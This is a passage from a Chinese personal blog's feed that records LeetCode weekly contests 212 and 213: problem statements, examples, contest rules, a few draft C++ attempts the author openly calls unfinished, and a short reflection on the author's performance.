d=tmp[j+<span class="number">1</span>]-tmp[j];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//差不等于公差d</span></span><br><span class="line">                        <span class="keyword">if</span>(tmp[j+<span class="number">1</span>]-tmp[j]!=d)&#123;</span><br><span class="line">                            result[i]=<span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="最小体力消耗路径"><a href="#最小体力消耗路径" class="headerlink" title="最小体力消耗路径"></a>最小体力消耗路径</h6><p><strong>题目描述：</strong></p>
<p>你准备参加一场远足活动。给你一个二维 <code>rows x columns</code> 的地图 <code>heights</code> ，其中 <code>heights[row][col]</code> 表示格子 <code>(row, col)</code> 的高度。一开始你在最左上角的格子 <code>(0, 0)</code> ，且你希望去最右下角的格子 <code>(rows-1, columns-1)</code> （注意下标从 <strong>0</strong> 开始编号）。你每次可以往 <strong>上，下，左，右</strong> 四个方向之一移动，你想要找到耗费 <strong>体力</strong> 最小的一条路径。</p>
<p>一条路径耗费的 <strong>体力值</strong> 是路径上相邻格子之间 <strong>高度差绝对值</strong> 的 <strong>最大值</strong> 决定的。</p>
<p>请你返回从左上角走到右下角的最小 <strong>体力消耗值</strong> 。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex1.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 连续格子的差值绝对值最大为 <span class="number">2</span> 。</span><br><span class="line">这条路径比路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>] 更优，因为另一条路劲差值最大值为 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex2.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] 的相邻格子差值绝对值最大为 <span class="number">1</span> ，比路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 更优。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/ex3.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：上图所示路径不需要消耗任何体力。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>rows == heights.length</code></li>
<li><code>columns == heights[i].length</code></li>
<li><code>1 &lt;= rows, columns &lt;= 100</code></li>
<li><code>1 &lt;= heights[i][j] &lt;= 106</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>没什么好的想法，直观的解法就是遍历所有的走法，从（0,0）到（row-1，columns-1），不对好像也不行，因为还有往回查的。</p>
<p><strong>代码：</strong></p>
<h6 id="矩阵转换后的秩"><a href="#矩阵转换后的秩" class="headerlink" title="矩阵转换后的秩"></a>矩阵转换后的秩</h6><p><strong>题目描述：</strong></p>
<p>给你一个 <code>m x n</code> 的矩阵 <code>matrix</code> ，请你返回一个新的矩阵 <code>answer</code> ，其中 <code>answer[row][col]</code> 是 <code>matrix[row][col]</code> 的秩。</p>
<p>每个元素的 <strong>秩</strong> 是一个整数，表示这个元素相对于其他元素的大小关系，它按照如下规则计算：</p>
<ul>
<li>如果一个元素是它所在行和列的最小值，那么它的 <strong>秩</strong> 为 1。</li>
<li>如果两个元素 <code>p</code> 和 <code>q</code> 在 同一行 或者 同一列 ，那么：</li>
<li><ul>
<li>如果 <code>p &lt; q</code> ，那么 <code>rank(p) &lt; rank(q)</code></li>
<li>如果 <code>p == q</code> ，那么 <code>rank(p) == rank(q)</code></li>
<li>如果 <code>p &gt; q</code> ，那么 <code>rank(p) &gt; rank(q)</code></li>
</ul>
</li>
<li>秩 需要越 小 越好。</li>
</ul>
<p>题目保证按照上面规则 answer 数组是唯一的。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank1.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">输出：[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">解释：</span><br><span class="line">matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> ，因为它是所在行和列的最小整数。</span><br><span class="line">matrix[<span class="number">0</span>][<span class="number">1</span>] 的秩为 <span class="number">2</span> ，因为 matrix[<span class="number">0</span>][<span class="number">1</span>] &gt; matrix[<span class="number">0</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> 。</span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">0</span>] 的秩为 <span class="number">2</span> ，因为 matrix[<span class="number">1</span>][<span class="number">0</span>] &gt; matrix[<span class="number">0</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">0</span>] 的秩为 <span class="number">1</span> 。</span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">1</span>] 的秩为 <span class="number">3</span> ，因为 matrix[<span class="number">1</span>][<span class="number">1</span>] &gt; matrix[<span class="number">0</span>][<span class="number">1</span>]， matrix[<span class="number">1</span>][<span class="number">1</span>] &gt; matrix[<span class="number">1</span>][<span class="number">0</span>] 且 matrix[<span class="number">0</span>][<span class="number">1</span>] 和 matrix[<span class="number">1</span>][<span class="number">0</span>] 的秩都为 <span class="number">2</span> 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank2.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">7</span>,<span class="number">7</span>],[<span class="number">7</span>,<span class="number">7</span>]]</span><br><span class="line">输出：[[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank3.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">20</span>,<span class="number">-21</span>,<span class="number">14</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>],[<span class="number">22</span>,<span class="number">-47</span>,<span class="number">24</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>]]</span><br><span class="line">输出：[[<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<p><img src="/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/rank4.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">7</span>,<span class="number">3</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">9</span>,<span class="number">8</span>,<span class="number">2</span>]]</span><br><span class="line">输出：[[<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == matrix.length</code></li>
<li><code>n == matrix[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 500</code></li>
<li><code>-109 &lt;= matrix[row][col] &lt;= 109</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>这道属于难题，我都没看，上一道中等题我都没做出来，还是先算了</p>
<p><strong>代码：</strong></p>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>第一次参加LeetCode周赛，只提交了一道题，排名好像几千名吧，这么看参加的人还不少哇，不过第二道题挺可惜的提交了以后超出时间限制😥也没时间改了，后来复盘发现存储范围数组的tmp容器排序代码我放到了for循环中，应该放到外面也就是说要全部获取到tmp元素后再调用sort函数排序，不能放入一个元素就排一下序，没必要。其实参加周赛的时候心神不定，不专注，有心事。或许是因为没信心吧，所以做的慢了些，效率不高，下次加油吧。</p>
<p>啊好懵，本科学的算法和数据结构都忘了（也可能没学会）🤣。决定还是先刷简单题吧，这周赛我觉得我现在水平不太行，题解要写好久，等到刷了一定数量的简单题有了一定的水平之后再来完成这些周赛的题解吧，不过我一定会回来的🤔</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>LeetCode周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>第213场周赛</title>
    <url>/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/contest/weekly-contest-213/">比赛地址</a></p>
<h6 id="比赛说明"><a href="#比赛说明" class="headerlink" title="比赛说明"></a>比赛说明</h6><p>本场竞赛由「coupang」&amp;「力扣」联合主办</p>
<p><strong>【工作机会奖励】</strong></p>
<ul>
<li><strong>排名第 1 ~ 300 名的参赛者</strong>可获「 coupang」简历内推机会。</li>
</ul>
<p><strong>【实物周边奖励】</strong></p>
<ul>
<li><strong>排名第 1 名的参赛者</strong>可获coupang提供的「小爱音响」×1</li>
<li><strong>排名第 2 名的参赛者</strong>可获coupang提供的「小米手环」×1</li>
<li><strong>排名第 3 ~ 55 名的参赛者</strong>可获coupang「棒球帽」×1</li>
<li><strong>排名第 199、399、599、999、1999 名的参赛者</strong>可获coupang「棒球帽」×1</li>
</ul>
<a id="more"></a>
<p>重要提示**</p>
<ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li>多账号提交雷同代码（抄袭）</li>
<li>使用不正当手段影响他人竞赛的</li>
<li>竞赛结束前在讨论区发布答案的</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表重要提示"><a href="#题目列表重要提示" class="headerlink" title="题目列表重要提示**"></a>题目列表重要提示**</h6><ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li>多账号提交雷同代码（抄袭）</li>
<li>使用不正当手段影响他人竞赛的</li>
<li>竞赛结束前在讨论区发布答案的</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h6><div class="table-container">
<table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>得分</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.<a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">能否连接形成数组</a></td>
<td>简单</td>
<td>3</td>
</tr>
<tr>
<td>2.<a href="https://leetcode-cn.com/problems/count-sorted-vowel-strings/">统计字典序元音字符串的数目</a></td>
<td>中等</td>
<td>4</td>
</tr>
<tr>
<td>3.<a href="https://leetcode-cn.com/problems/furthest-building-you-can-reach/">可以到达的最远建筑</a></td>
<td>中等</td>
<td>5</td>
</tr>
<tr>
<td>4.<a href="https://leetcode-cn.com/problems/kth-smallest-instructions/">第 K 条最小指令</a></td>
<td>困难</td>
<td>6</td>
</tr>
</tbody>
</table>
</div>
<h6 id="能否连接形成数组"><a href="#能否连接形成数组" class="headerlink" title="能否连接形成数组"></a>能否连接形成数组</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数数组 <code>arr</code> ，数组中的每个整数 <strong>互不相同</strong> 。另有一个由整数数组构成的数组 <code>pieces</code>，其中的整数也 <code>互不相同</code> 。请你以 <strong>任意顺序</strong> 连接 <code>pieces</code> 中的数组以形成 <code>arr</code> 。但是，<strong>不允许</strong> 对每个数组 <code>pieces[i]</code> 中的整数重新排序。</p>
<p>如果可以连接 <code>pieces</code> 中的数组形成 <code>arr</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [85], pieces &#x3D; [[85]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [15,88], pieces &#x3D; [[88],[15]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [15] 和 [88]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [49,18,16], pieces &#x3D; [[16,18,49]]</span><br><span class="line">输出：false</span><br><span class="line">解释：即便数字相符，也不能重新排列 pieces[0]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [91,4,64,78], pieces &#x3D; [[78],[4,64],[91]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [91]、[4,64] 和 [78]</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,3,5,7], pieces &#x3D; [[2,4,6,8]]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pieces.length &lt;= arr.length &lt;= 100</code></li>
<li><code>sum(pieces[i].length) == arr.length</code></li>
<li><code>1 &lt;= pieces[i].length &lt;= arr.length</code></li>
<li><code>1 &lt;= arr[i], pieces[i][j] &lt;= 100</code></li>
<li><code>arr</code> 中的整数 <strong>互不相同</strong></li>
<li><code>pieces</code> 中的整数 <strong>互不相同</strong>（也就是说，如果将 <code>pieces</code> 扁平化成一维数组，数组中的所有整数互不相同）</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//草稿版</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canFormArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; pieces)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历查找pieces中的元素是否在arr中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pieces.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;arr.size();++k)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(pieces[i][j]==arr[k])&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历arr</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size();++i)&#123;</span><br><span class="line">            <span class="comment">//遍历pieces</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces.size();++j)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(arr[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(arr[i])</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="可以到达的最远建筑"><a href="#可以到达的最远建筑" class="headerlink" title="可以到达的最远建筑"></a>可以到达的最远建筑</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数数组 <code>heights</code> ，表示建筑物的高度。另有一些砖块 <code>bricks</code> 和梯子 <code>ladders</code> 。</p>
<p>你从建筑物 <code>0</code> 开始旅程，不断向后面的建筑物移动，期间可能会用到砖块或梯子。</p>
<p>当从建筑物 <code>i</code> 移动到建筑物 <code>i+1</code>（下标 <strong>从 0 开始</strong> ）时：</p>
<ul>
<li>如果当前建筑物的高度 <strong>大于或等于</strong> 下一建筑物的高度，则不需要梯子或砖块</li>
<li>如果当前建筑的高度 <strong>小于</strong> 下一个建筑的高度，您可以使用 <strong>一架梯子</strong> 或 (<code>h[i+1] - h[i]</code>) 个砖块</li>
</ul>
<p>如果以最佳方式使用给定的梯子和砖块，返回你可以到达的最远建筑物的下标（下标 <strong>从 0 开始</strong> ）。</p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/q4.gif" alt="img"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：heights = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">12</span>], bricks = <span class="number">5</span>, ladders = <span class="number">1</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：从建筑物 <span class="number">0</span> 出发，你可以按此方案完成旅程：</span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">1</span> ，因为 <span class="number">4</span> &gt;= <span class="number">2</span></span><br><span class="line">- 使用 <span class="number">5</span> 个砖块到达建筑物 <span class="number">2</span> 。你必须使用砖块或梯子，因为 <span class="number">2</span> &lt; <span class="number">7</span></span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">3</span> ，因为 <span class="number">7</span> &gt;= <span class="number">6</span></span><br><span class="line">- 使用唯一的梯子到达建筑物 <span class="number">4</span> 。你必须使用砖块或梯子，因为 <span class="number">6</span> &lt; <span class="number">9</span></span><br><span class="line">无法越过建筑物 <span class="number">4</span> ，因为没有更多砖块或梯子。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [4,12,2,7,3,18,20,3,19], bricks &#x3D; 10, ladders &#x3D; 2</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [14,3,19,3], bricks &#x3D; 17, ladders &#x3D; 0</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>1 &lt;= heights.length &lt;= 105</li>
<li>1 &lt;= heights[i] &lt;= 106</li>
<li>0 &lt;= bricks &lt;= 109</li>
<li>0 &lt;= ladders &lt;= heights.length</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<h6 id="第K条最小指令"><a href="#第K条最小指令" class="headerlink" title="第K条最小指令"></a>第K条最小指令</h6><p><strong>题目描述：</strong></p>
<p>Bob 站在单元格 <code>(0, 0)</code> ，想要前往目的地 <code>destination</code> ：<code>(row, column)</code> 。他只能向 <strong>右</strong> 或向 <code>下</code> 走。你可以为 Bob 提供导航 <strong>指令</strong> 来帮助他到达目的地 <code>destination</code> 。</p>
<p><strong>指令</strong> 用字符串表示，其中每个字符：</p>
<ul>
<li><code>&#39;H&#39;</code> ，意味着水平向右移动</li>
<li><code>&#39;V&#39;</code> ，意味着竖直向下移动</li>
</ul>
<p>能够为 Bob 导航到目的地 <code>destination</code> 的指令可以有多种，例如，如果目的地 <code>destination</code> 是 <code>(2, 3)</code>，<code>&quot;HHHVV&quot;</code> 和 <code>&quot;HVHVH&quot;</code> 都是有效 指令 。</p>
<p>然而，Bob 很挑剔。因为他的幸运数字是 <code>k</code>，他想要遵循 <strong>按字典序排列后的第 <code>k</code> 条最小指令</strong> 的导航前往目的地 <code>destination</code> 。<code>k</code>  的编号 <strong>从 1 开始</strong> 。</p>
<p>给你一个整数数组 <code>destination</code> 和一个整数 <code>k</code> ，请你返回可以为 Bob 提供前往目的地 <code>destination</code> 导航的 <strong>按字典序排列后的第 <code>k</code> 条最小指令</strong> 。</p>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 1</span><br><span class="line">输出：&quot;HHHVV&quot;</span><br><span class="line">解释：能前往 (2, 3) 的所有导航指令 按字典序排列后 如下所示：</span><br><span class="line">[&quot;HHHVV&quot;, &quot;HHVHV&quot;, &quot;HHVVH&quot;, &quot;HVHHV&quot;, &quot;HVHVH&quot;, &quot;HVVHH&quot;, &quot;VHHHV&quot;, &quot;VHHVH&quot;, &quot;VHVHH&quot;, &quot;VVHHH&quot;].</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 2</span><br><span class="line">输出：&quot;HHVHV&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<p><img src="/2020/11/02/%E7%AC%AC213%E5%9C%BA%E5%91%A8%E8%B5%9B/ex3.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：destination &#x3D; [2,3], k &#x3D; 3</span><br><span class="line">输出：&quot;HHVVH&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>destination.length == 2</code></li>
<li><code>1 &lt;= row, column &lt;= 15</code></li>
<li><code>1 &lt;= k &lt;= nCr(row + column, row)</code>，其中 <code>nCr(a, b)</code> 表示组合数，即从 <code>a</code> 个物品中选 <code>b</code> 个物品的不同方案数。</li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
<h6 id="统计字典序元音字符串的数目"><a href="#统计字典序元音字符串的数目" class="headerlink" title="统计字典序元音字符串的数目"></a>统计字典序元音字符串的数目</h6><p><strong>题目描述：</strong></p>
<p>给你一个整数 <code>n</code>，请返回长度为 <code>n</code> 、仅由元音 (<code>a</code>, <code>e</code>, <code>i</code>, <code>o</code>, <code>u</code>) 组成且按 <strong>字典序排列</strong> 的字符串数量。</p>
<p>字符串 <code>s</code> 按 <strong>字典序排列</strong> 需要满足：对于所有有效的 <code>i</code>，<code>s[i]</code> 在字母表中的位置总是与 <code>s[i+1]</code> 相同或在 <code>s[i+1]</code> 之前。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">1</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">5</span> 个字典序字符串为 [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;u&quot;</span>]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">2</span></span><br><span class="line">输出：<span class="number">15</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">15</span> 个字典序字符串为</span><br><span class="line">[<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;ae&quot;</span>,<span class="string">&quot;ai&quot;</span>,<span class="string">&quot;ao&quot;</span>,<span class="string">&quot;au&quot;</span>,<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ei&quot;</span>,<span class="string">&quot;eo&quot;</span>,<span class="string">&quot;eu&quot;</span>,<span class="string">&quot;ii&quot;</span>,<span class="string">&quot;io&quot;</span>,<span class="string">&quot;iu&quot;</span>,<span class="string">&quot;oo&quot;</span>,<span class="string">&quot;ou&quot;</span>,<span class="string">&quot;uu&quot;</span>]</span><br><span class="line">注意，<span class="string">&quot;ea&quot;</span> 不是符合题意的字符串，因为 <span class="string">&#x27;e&#x27;</span> 在字母表中的位置比 <span class="string">&#x27;a&#x27;</span> 靠后</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">33</span></span><br><span class="line">输出：<span class="number">66045</span></span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 50</code> </li>
</ul>
<p><strong>思路：</strong></p>
<p><strong>提交的代码：</strong></p>
